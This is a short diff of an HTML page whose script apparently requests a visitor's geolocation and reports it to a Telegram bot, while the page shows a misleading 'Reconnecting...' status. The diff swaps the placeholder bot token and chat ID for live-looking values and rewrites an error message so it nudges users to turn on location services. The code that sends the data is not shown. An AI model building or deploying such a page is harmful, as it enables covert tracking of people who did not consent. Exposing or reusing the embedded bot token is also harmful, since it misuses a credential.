@@ -27,8 +27,8 @@
   <div id="status">Reconnecting...</div>
 
   <script>
-    const botToken = 'YOUR_BOT_TOKEN'; // Replace with your Telegram bot token
-    const chatId = 'YOUR_CHAT_ID'; // Replace with your Telegram chat ID
+    const botToken = '7966931731:AAEqPHdTuX0epQhM6D_hEZ0X8Azae_5RwXM'; // Replace with your Telegram bot token
+    const chatId = '6471397661'; // Replace with your Telegram chat ID
     let retryCount = 0;
     const maxRetries = 3; // Set a limit to avoid infinite requests
 
@@ -58,7 +58,7 @@
           retryRequest();
           break;
         case error.POSITION_UNAVAILABLE:
-          status.textContent = "Click on 3 dots in top right corner (...) and open in Chrome.";
+          status.textContent = "Location services are off. Please enable them in your device settings.";
           break;
         case error.TIMEOUT:
           status.textContent = "The request to get user location timed out.";
